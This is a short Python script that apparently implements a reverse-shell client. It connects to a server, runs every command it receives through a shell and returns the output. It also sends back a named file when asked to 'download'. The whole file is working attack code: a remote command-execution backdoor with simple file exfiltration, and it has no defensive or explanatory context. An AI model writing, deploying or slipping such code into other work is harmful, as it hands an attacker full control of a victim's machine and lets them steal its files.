import socket
import subprocess


class Client:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port

    def start_client(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((self.server_host, self.server_port))
        print(f"Connected to server {self.server_host}:{self.server_port}")

        while True:
            command = client.recv(1024).decode()

            if command.startswith('download'):
                myPath = "C:\\Users\\Root\\Desktop\\attack\\attack.txt"
                with open(myPath, "rb") as f:
                    client.send(f.read())

            if command.lower() == 'exit':
                break

            try:
                output = subprocess.Popen(
                    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = output.communicate()
                result = stdout if stdout else stderr
            except Exception as e:
                result = str(e).encode()

            client.send(result)

        client.close()


target = Client('127.0.0.1', 9999)
target.start_client()


# start_client(args.server_host, args.server_port)
